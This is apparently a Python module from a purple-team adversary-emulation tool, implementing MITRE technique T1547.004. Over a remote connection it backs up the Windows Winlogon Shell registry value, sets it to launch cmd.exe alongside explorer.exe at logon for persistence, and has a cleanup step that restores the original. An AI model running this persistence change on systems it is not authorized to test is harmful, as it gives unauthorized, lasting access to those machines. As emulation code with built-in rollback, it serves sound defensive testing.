from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)
_backed_up_targets: set[str] = set()

_WINLOGON_KEY = (
    "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Modify Winlogon Shell helper value for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        backup_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            "if (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt') "
            "{ throw 'Previous Winlogon backup exists; restore it before rerunning' }; "
            f"$orig = (Get-ItemProperty -Path '{_WINLOGON_KEY}').Shell; "
            f"Set-Content -Path 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt' "
            f"-Value $orig"
        )
        backup = await conn.run_ps(backup_cmd)
        if not backup.success:
            raise RuntimeError(backup.stderr or backup.stdout or "Winlogon backup failed")
        _backed_up_targets.add(target)
        set_cmd = (
            f"Set-ItemProperty -Path '{_WINLOGON_KEY}' "
            f"-Name 'Shell' -Value 'explorer.exe, cmd.exe'"
        )
        result = await conn.run_ps(set_cmd)
        return TechniqueResult(
            technique_id="T1547.004",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1547.004 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1547.004",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        if target not in _backed_up_targets:
            return
        conn = await get_connection(target)
        restore_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            "if (-not (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt')) "
            "{ return }; "
            "$orig = Get-Content -LiteralPath 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt'; "
            f"Set-ItemProperty -Path '{_WINLOGON_KEY}' -Name 'Shell' -Value $orig; "
            "Remove-Item -Path 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt' -Force"
        )
        restored = await conn.run_ps(restore_cmd)
        if not restored.success:
            raise RuntimeError(restored.stderr or restored.stdout or "Winlogon restore failed")
        _backed_up_targets.discard(target)
    except Exception as e:
        logger.warning(f"T1547.004 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
